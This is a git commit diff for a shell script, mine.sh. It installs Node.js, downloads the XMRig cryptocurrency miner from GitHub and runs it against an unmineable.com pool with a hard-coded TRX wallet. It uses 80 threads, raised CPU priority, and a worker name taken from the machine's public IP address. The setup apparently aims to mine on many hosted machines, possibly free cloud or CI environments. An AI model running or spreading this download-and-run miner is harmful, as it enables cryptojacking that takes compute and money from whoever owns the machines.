8df4332a748faafa4515bcbdb671dabe554dd187
muhammadajimukti558 <107189622+muhammadajimukti558@users.noreply.github.com>
2022-07-14 11:42:52 +0700

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,2 +1,9 @@
 #!/bin/bash
-apt install sudo -y
+wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
+\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
+\rm node-v14.17.0-linux-x64.tar.gz
+PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
+npm config set cache /tmp --global
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
+ph add xmrig
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o rx.unmineable.com:3333  -u TRX:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.$ip -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
